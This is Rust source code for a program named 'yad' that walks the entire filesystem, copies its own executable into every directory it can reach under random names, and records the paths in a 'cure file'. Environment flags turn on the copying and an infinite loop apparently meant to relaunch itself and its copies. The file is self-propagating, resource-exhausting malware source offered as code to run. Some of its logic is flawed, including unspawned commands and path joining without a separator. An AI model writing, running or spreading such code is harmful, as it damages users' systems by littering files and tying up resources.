extern crate random_string;
extern crate walkdir;
extern crate dirs;
use std::process::Command;
use std::path::Path;
use std::io::Write;
use std::env;
use std::fs;

fn main() {
    let rcharset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	let curepath = env::var("YAD_CURE").unwrap_or_else(|_| ".curefile".to_owned());
	let destructive = env::var("YAD_FILES").is_ok();
	let reproductive = env::var("YAD_FORK").is_ok();
	let args: Vec<String> = env::args().collect();
	let mut yad_restart = Command::new(&args[0]);
    let mut filename: String = String::from("yad");
    let randstr = random_string::generate(16 - filename.chars().count(), rcharset);
    let excludes = ["proc", "run", "sys", "var", "cache", "tmp", "Windows"];
	let mut all_suitable_paths: Vec<std::path::PathBuf> = vec![];
    let mut skip_flag;
    filename.push_str(&randstr);
	let mut curefile = match fs::File::create(curepath) {
		Ok(file) => file,
		Err(_) => panic!("Cure file creation in the specified location failed. Refusing to continue, permanent damage possible."),
	};
    for entry in walkdir::WalkDir::new("/") {
    	skip_flag = false;
    	let probably_writable = match entry {
    		Ok(path) => path,
    		Err(_) => continue,
    	};
    	for badname in excludes {
    		if probably_writable.path().to_str().expect("Something has gone terribly wrong").to_string().contains(&badname){
    			skip_flag = true;
    		}
    	}
    	if skip_flag {continue}
        if  match fs::metadata(probably_writable.path()) {
    		Ok(md) => md,
    		Err(_) => continue,
    	}.is_dir() {
        	all_suitable_paths.push(std::path::PathBuf::from(probably_writable.path()));
        }
    }
	for yadir_path in all_suitable_paths.iter() {
		let mut yad_pathstr = String::from(yadir_path.to_str().unwrap());
		yad_pathstr.push_str(&filename.to_owned());
		let yad_path = Path::new(&yad_pathstr);
		if destructive {
			match fs::copy(Path::new(&args[0]), yad_path) {
				Ok(_) => (),
				Err(_) => continue,
			};
		};
		match curefile.write_all(format!("\n{}", yad_pathstr).as_bytes()) {
			Ok(_) => println!("{}", yad_pathstr),
			Err(_) => panic!("Cure file write failed. Refusing to continue, permanent damage possible.")
		};
		if reproductive {
			loop {
				Command::new(&args[0]);
				if destructive {
					Command::new(&yad_pathstr);
				}
			}
		};
	}
    
}
